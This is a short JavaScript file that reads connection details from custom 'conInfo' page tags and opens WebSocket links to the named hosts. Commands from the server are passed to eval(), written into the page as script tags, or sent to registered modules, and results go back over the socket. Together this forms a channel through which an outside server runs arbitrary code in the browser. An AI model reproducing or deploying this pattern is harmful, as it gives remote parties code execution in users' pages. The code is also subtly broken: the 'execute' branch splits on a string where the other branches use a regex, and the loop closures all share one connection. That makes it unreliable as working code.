var modules = {};
var infos = document.getElementsByTagName('conInfo');
for(var i = 0;i<infos.length;i++){
var info = infos[i];
var ws = new WebSocket('ws:' + info.getAttribute('info').split(':')[0] + ":" + info.getAttribute('info').split(':')[1]);
ws.onopen = function(){
ws.send('connect:' + info.getAttribute('info').split(':')[2]);
}
ws.onmessage = function(event){
var message = event.data;
console.log(message);
var command = message.split(' ')[0];
switch(command){
 case "execute": 
  var r = eval(message.split("/ (.+)?/")[1]);
  if(r!=undefined){
  	sendFeedback(r);
  }else{
  	sendFeedback('undefined');
  }
  break;
 case "save":
  document.writeln("<script>" + message.split(/ (.+)?/)[1] + "</script>");
  break;
 default:
  if(modules[command]!=undefined){
  	sendFeedback(modules[command](message.split(/ (.+)?/)[1]));
  }
  break;
}
}
}
function sendFeedback(message){
ws.send(message);
}
function registerModule(name,module){
modules[name] = module;
this[name] = module;
}
function executeModule(name,args){
modules[name](args);
}